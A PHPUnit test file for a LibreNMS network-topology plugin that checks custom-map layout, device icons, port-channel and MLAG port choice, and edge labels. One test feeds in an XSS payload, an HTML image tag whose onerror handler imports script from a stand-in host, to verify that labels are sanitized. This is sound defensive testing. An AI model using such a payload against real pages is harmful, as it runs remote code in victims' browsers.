<?php

namespace Agoodley\LibrenmsTopology\Tests\Unit;

use Agoodley\LibrenmsTopology\Sharing\CustomMapLayout;
use Agoodley\LibrenmsTopology\Stp\StpIndex;
use Agoodley\LibrenmsTopology\Topology\L2Builder;
use PHPUnit\Framework\TestCase;

class CustomMapLayoutTest extends TestCase
{
    private const STYLE = ['text_face' => 'arial', 'text_size' => 14, 'text_colour' => '#343434', 'node_size' => 25,
        'edge_text_face' => 'courier', 'edge_text_size' => 11, 'edge_text_colour' => '#111111', 'edge_text_align' => 'top'];

    private static function device(int $id, string $role, string $label = ''): array
    {
        return ['id' => 'd:' . $id, 'type' => 'device', 'managed' => true, 'device_id' => $id, 'role' => $role, 'label' => $label ?: 'dev' . $id];
    }

    private static function neighbor(string $name, string $role): array
    {
        return ['id' => 'u:' . $name, 'type' => 'unmanaged', 'managed' => false, 'device_id' => null, 'role' => $role, 'label' => $name];
    }

    /**
     * An L2 map link as L2Builder makes it: ends with their (aggregate) port, the member cables and the LAG flags.
     */
    private static function link(string $from, string $to, ?int $portA, ?int $portB = null, int $speed = 10000000000, ?array $lag = null, ?array $members = null): array
    {
        return ['from' => $from, 'to' => $to, 'a' => ['port_id' => $portA], 'b' => $portB === null ? null : ['port_id' => $portB], 'speed' => $speed, 'lag' => $lag,
            'members' => $members ?? [['a_port_id' => $portA, 'b_port_id' => $portB]]];
    }

    private static function build(array $nodes, array $edges, array $positions): array
    {
        return CustomMapLayout::build(['nodes' => $nodes, 'edges' => $edges], $positions, self::STYLE);
    }

    public function testPositionsKeepTheLayoutFromTheMargin(): void
    {
        $layout = self::build([self::device(1, 'router'), self::device(2, 'switch'), self::device(3, 'switch')], [],
            ['d:1' => [-200.4, -50], 'd:2' => [300, 450.6], 'd:3' => [1500, 100], 'd:99' => [9999, 9999]]);

        $this->assertSame([80, 80], [$layout['nodes']['d:1']['x_pos'], $layout['nodes']['d:1']['y_pos']]);
        $this->assertSame([580, 581], [$layout['nodes']['d:2']['x_pos'], $layout['nodes']['d:2']['y_pos']]);
        $this->assertSame([1780, 230], [$layout['nodes']['d:3']['x_pos'], $layout['nodes']['d:3']['y_pos']]);
        $this->assertSame(1860, $layout['width']);
        $this->assertSame(661, $layout['height']);
        $this->assertSame(0, $layout['stats']['unplaced']);
        $this->assertArrayNotHasKey('d:99', $layout['nodes'], 'positions of nodes that are not on the map are ignored');
    }

    public function testSmallMapsGetTheMinimumSizeAndNodesWithoutPositionGoBelow(): void
    {
        $layout = self::build([self::device(1, 'router'), self::device(2, 'switch'), self::device(3, 'switch')], [], ['d:1' => [10, 10], 'd:2' => ['x', 5]]);

        $this->assertSame([CustomMapLayout::MIN_WIDTH, CustomMapLayout::MIN_HEIGHT], [$layout['width'], $layout['height']]);
        $this->assertSame(2, $layout['stats']['unplaced']);
        $this->assertSame([80, 180], [$layout['nodes']['d:2']['x_pos'], $layout['nodes']['d:2']['y_pos']]);
        $this->assertSame([200, 180], [$layout['nodes']['d:3']['x_pos'], $layout['nodes']['d:3']['y_pos']]);

        $none = self::build([self::device(1, 'router')], [], []);
        $this->assertSame([80, 80], [$none['nodes']['d:1']['x_pos'], $none['nodes']['d:1']['y_pos']]);
    }

    public function testNodesAreRoleIconsThatLibreNmsColorsByStatus(): void
    {
        $nodes = [
            self::device(1, 'router'), self::device(2, 'l3switch'), self::device(3, 'server'), self::device(4, 'switch'),
            self::neighbor('phone-1', 'phone'), self::neighbor('box', 'unknown'),
            ['id' => 's:abc', 'type' => 'subnet', 'managed' => false, 'role' => 'subnet', 'label' => "10.0.0.0/24\nBLUE"],
            ['id' => 'as:65001', 'type' => 'as', 'managed' => false, 'role' => 'cloud', 'label' => 'AS65001'],
        ];
        $layout = self::build($nodes, [], []);
        $n = $layout['nodes'];

        $this->assertSame(['icon', 'f4d7', 1, null], [$n['d:1']['style'], $n['d:1']['icon'], $n['d:1']['device_id'], $n['d:1']['colour_bdr']],
            'no color for a monitored device: LibreNMS colors its icon by status');
        $this->assertSame(['f0e8', 'f233', 'f796'], [$n['d:2']['icon'], $n['d:3']['icon'], $n['d:4']['icon']]);
        $this->assertSame(['icon', 'f095', null, CustomMapLayout::UNMANAGED_COLOR], [$n['u:phone-1']['style'], $n['u:phone-1']['icon'], $n['u:phone-1']['device_id'], $n['u:phone-1']['colour_bdr']]);
        $this->assertSame('f6ff', $n['u:box']['icon']);
        $this->assertSame(['box', null, '#FFF6D5', "10.0.0.0/24\nBLUE"], [$n['s:abc']['style'], $n['s:abc']['icon'], $n['s:abc']['colour_bg'], $n['s:abc']['label']]);
        $this->assertSame(['icon', 'f0c2'], [$n['as:65001']['style'], $n['as:65001']['icon']]);
        $this->assertSame(25, $n['d:1']['size']);
        $this->assertLessThan(25, $n['u:phone-1']['size']);
        $this->assertSame(['devices' => 4, 'unmanaged' => 2, 'subnets' => 1, 'clouds' => 1], array_intersect_key($layout['stats'], array_flip(['devices', 'unmanaged', 'subnets', 'clouds'])));
    }

    public function testLabelsCannotCarryHtmlIntoLibreNms(): void
    {
        $layout = self::build([
            self::neighbor('<img src=x onerror=import(\'//e.vil\')>', 'unknown'),
            self::device(1, 'switch', 'a&b "c" `d`' . "\x07\x1b"),
        ], [self::link('d:1', 'u:<img src=x onerror=import(\'//e.vil\')>', 5)], []);
        $labels = array_merge(array_column($layout['nodes'], 'label'), array_column($layout['edges'], 'label'));

        $this->assertSame('‹img src=x onerror=import(’//e.vil’)›', $layout['nodes']['u:<img src=x onerror=import(\'//e.vil\')>']['label']);
        $this->assertSame('a＆b ″c″ ˋdˋ', $layout['nodes']['d:1']['label']);
        foreach ($labels as $label) {
            $this->assertDoesNotMatchRegularExpression('/[<>"\'&`\x00-\x09\x0B-\x1F]/', $label);
        }
        $this->assertSame(str_repeat('ü', 50), CustomMapLayout::label(str_repeat('ü', 60), 50), 'cut by characters');
        $this->assertSame("10.0.0.0/24\nBLUE", CustomMapLayout::label("10.0.0.0/24\nBLUE", 50), 'line breaks stay');
        $this->assertSame('o?k', CustomMapLayout::label("o\xffk", 50), 'invalid UTF-8 does not empty the label');
    }

    public function testEdgesUseLibreNmsEdgeTextSettings(): void
    {
        $edge = self::build([self::device(1, 'switch'), self::device(2, 'switch')], [self::link('d:1', 'd:2', 101, 201)], [])['edges'][0];

        $this->assertSame(['courier', 11, '#111111', 'top'], [$edge['text_face'], $edge['text_size'], $edge['text_colour'], $edge['text_align']]);
    }

    public function testASingleCableTakesItsPortNearEndFirst(): void
    {
        $layout = self::build([self::device(1, 'switch'), self::device(2, 'switch'), self::neighbor('ap', 'wireless'), self::device(3, 'switch')], [
            self::link('d:1', 'd:2', 101, 201),
            self::link('d:1', 'u:ap', null, null, 1000000000),
            self::link('d:2', 'd:3', null, 301),
        ], ['d:1' => [0, 0], 'd:2' => [100, 0], 'u:ap' => [0, 100], 'd:3' => [200, 0]]);
        $edges = $layout['edges'];

        $this->assertSame([101, false, true], [$edges[0]['port_id'], $edges[0]['reverse'], $edges[0]['showpct']]);
        $this->assertSame([null, false, false], [$edges[1]['port_id'], $edges[1]['reverse'], $edges[1]['showpct']]);
        $this->assertSame([301, true], [$edges[2]['port_id'], $edges[2]['reverse']]);
        $this->assertSame(['d:1', 'd:2'], [$edges[0]['from'], $edges[0]['to']]);
        $this->assertSame(2, $layout['stats']['ports']);
        $this->assertSame([130, 80], [$edges[0]['mid_x'], $edges[0]['mid_y']], 'the middle of the line');
    }

    public function testPortChannelsOnlyWhenTheyAreWhollyTheLink(): void
    {
        $two = [['a_port_id' => 11, 'b_port_id' => 21], ['a_port_id' => 12, 'b_port_id' => 22]];
        $nodes = [self::device(1, 'switch'), self::device(2, 'switch')];
        $port = fn (?array $lag, array $members, ?int $a = 10, ?int $b = 20) => array_intersect_key(
            self::build($nodes, [self::link('d:1', 'd:2', $a, $b, 20000000000, $lag, $members)], [])['edges'][0], ['port_id' => 0, 'reverse' => 0]);

        $this->assertSame(['port_id' => 10, 'reverse' => false], $port(['members' => 2, 'a_whole' => true, 'b_whole' => true], $two));
        // side A's port-channel also has cables to another switch (MLAG): the far end's, which is only this link
        $this->assertSame(['port_id' => 20, 'reverse' => true], $port(['members' => 2, 'a_whole' => false, 'b_whole' => true], $two));
        // neither is only this link: no port of one cable for a link of two
        $this->assertSame(['port_id' => null, 'reverse' => false], $port(['members' => 2, 'a_whole' => false, 'b_whole' => false], $two));
        // the stack is only known on side B; side A's "port" is one of its cables
        $this->assertSame(['port_id' => 20, 'reverse' => true], $port(['members' => 2, 'a_whole' => false, 'b_whole' => true], $two, 11, 20));
        // one cable of an MLAG port-channel on each side: the cable's own port
        $this->assertSame(['port_id' => 11, 'reverse' => false], $port(['members' => 1, 'a_whole' => false, 'b_whole' => false], [$two[0]]));
    }

    public function testL3LinksTakeTheirAddressPorts(): void
    {
        $edges = self::build([self::device(1, 'router'), self::device(2, 'router')], [
            ['from' => 'd:1', 'to' => 'd:2', 'kind' => 'p2p', 'network' => '10.0.0.0/30', 'a' => ['port_id' => 5], 'b' => ['port_id' => 6]],
            ['from' => 'd:1', 'to' => 'd:2', 'kind' => 'ospf', 'a' => null, 'b' => null],
        ], [])['edges'];

        $this->assertSame([5, false, '10.0.0.0/30'], [$edges[0]['port_id'], $edges[0]['reverse'], $edges[0]['label']]);
        $this->assertSame([null, 'OSPF'], [$edges[1]['port_id'], $edges[1]['label']]);
    }

    /**
     * acc10's Po1 bundles two cables to core-a (up) and two to core-b (down), an MLAG; acc11's two cables to core-b
     * are a port-channel only core-b knows. "d:10" and "d:11" sort before "d:2", so the access switches are side A.
     */
    public function testMlagAndOneSidedPortChannelsGetTheRightPortFromL2Builder(): void
    {
        $devices = [];
        foreach ([1 => 'core-a', 2 => 'core-b', 10 => 'acc10', 11 => 'acc11'] as $id => $name) {
            $devices[$id] = ['device_id' => $id, 'hostname' => $name, 'display' => $name, 'status' => 1, 'disabled' => 0, 'role' => 'switch'];
        }
        $ports = [];
        $port = function (int $id, int $device, string $name, string $oper = 'up') use (&$ports): void {
            $ports[$id] = ['port_id' => $id, 'device_id' => $device, 'ifIndex' => $id, 'ifName' => $name, 'ifDescr' => $name, 'ifSpeed' => 10000000000,
                'ifOperStatus' => $oper, 'ifAdminStatus' => 'up', 'ifType' => 'ethernetCsmacd'];
        };
        $port(100, 10, 'Port-channel1');
        foreach ([101, 102, 103, 104] as $i => $id) {
            $port($id, 10, 'Te1/1/' . ($i + 1), $i < 2 ? 'up' : 'down');
        }
        $port(110, 1, 'Port-channel10');
        $port(111, 1, 'Te1/0/1');
        $port(112, 1, 'Te1/0/2');
        $port(120, 2, 'Port-channel20', 'down');
        $port(121, 2, 'Te1/0/1', 'down');
        $port(122, 2, 'Te1/0/2', 'down');
        $port(130, 2, 'Port-channel30');
        $port(131, 2, 'Te1/0/3');
        $port(132, 2, 'Te1/0/4');
        $port(141, 11, 'Te1/1/1');
        $port(142, 11, 'Te1/1/2');
        $lagParent = [101 => 100, 102 => 100, 103 => 100, 104 => 100, 111 => 110, 112 => 110, 121 => 120, 122 => 120, 131 => 130, 132 => 130];
        $links = [];
        foreach ([[10, 101, 1, 111], [10, 102, 1, 112], [10, 103, 2, 121], [10, 104, 2, 122], [11, 141, 2, 131], [11, 142, 2, 132]] as [$ld, $lp, $rd, $rp]) {
            $links[] = ['local_device_id' => $ld, 'local_port_id' => $lp, 'remote_device_id' => $rd, 'remote_port_id' => $rp,
                'remote_hostname' => $devices[$rd]['hostname'], 'remote_port' => $ports[$rp]['ifName'], 'remote_platform' => '', 'remote_version' => '', 'protocol' => 'lldp'];
        }
        $map = (new L2Builder($devices, $links, $ports, [], $lagParent, new StpIndex([], [], $lagParent)))->build(['collapseLag' => true]);
        $edges = [];
        foreach (CustomMapLayout::build($map, [], self::STYLE)['edges'] as $edge) {
            $edges[$edge['from'] . '-' . $edge['to']] = [$edge['port_id'], $edge['reverse']];
        }

        $this->assertSame([110, false], $edges['d:1-d:10'], 'core-a\'s Po10 is only this link');
        $this->assertSame([120, true], $edges['d:10-d:2'], 'not acc10\'s Po1, which also carries the link to core-a: core-b\'s Po20, which is down');
        $this->assertSame([130, true], $edges['d:11-d:2'], 'not one of acc11\'s cables: core-b\'s Po30');
    }

    public function testParallelLinksAreMovedApart(): void
    {
        $layout = self::build([self::device(1, 'switch'), self::device(2, 'switch')], [
            self::link('d:1', 'd:2', 101), self::link('d:2', 'd:1', 202), self::link('d:1', 'd:2', 103),
        ], ['d:1' => [0, 0], 'd:2' => [200, 0]]);
        $middles = array_map(fn ($e) => [$e['mid_x'], $e['mid_y']], $layout['edges']);

        $this->assertSame([[180, 80], [180, 80 + CustomMapLayout::PARALLEL_GAP], [180, 80 - CustomMapLayout::PARALLEL_GAP]], $middles);
    }

    public function testLinksToNodesThatAreNotOnTheMapAreLeftOut(): void
    {
        $layout = self::build([self::device(1, 'switch')], [self::link('d:1', 'd:2', 101), self::link('d:1', 'd:1', 102)], []);

        $this->assertSame([], $layout['edges']);
    }

    public function testEdgeLabels(): void
    {
        $this->assertSame('10G', CustomMapLayout::edgeLabel(self::link('d:1', 'd:2', 1)));
        $this->assertSame('2x 10G', CustomMapLayout::edgeLabel(self::link('d:1', 'd:2', 1, null, 20000000000, ['members' => 2])));
        $this->assertSame('', CustomMapLayout::edgeLabel(self::link('d:1', 'd:2', 1, null, 0)));
        $this->assertSame('10.0.0.0/30', CustomMapLayout::edgeLabel(['kind' => 'p2p', 'network' => '10.0.0.0/30']));
        $this->assertSame('', CustomMapLayout::edgeLabel(['kind' => 'member', 'network' => '10.0.1.0/24']));
        $this->assertSame('OSPF', CustomMapLayout::edgeLabel(['kind' => 'ospf']));
        $this->assertSame('eBGP AS65001', CustomMapLayout::edgeLabel(['kind' => 'bgp', 'type' => 'eBGP', 'remote_as' => 65001]));
        $this->assertSame('MPLS LSP', CustomMapLayout::edgeLabel(['kind' => 'mpls']));
    }
}
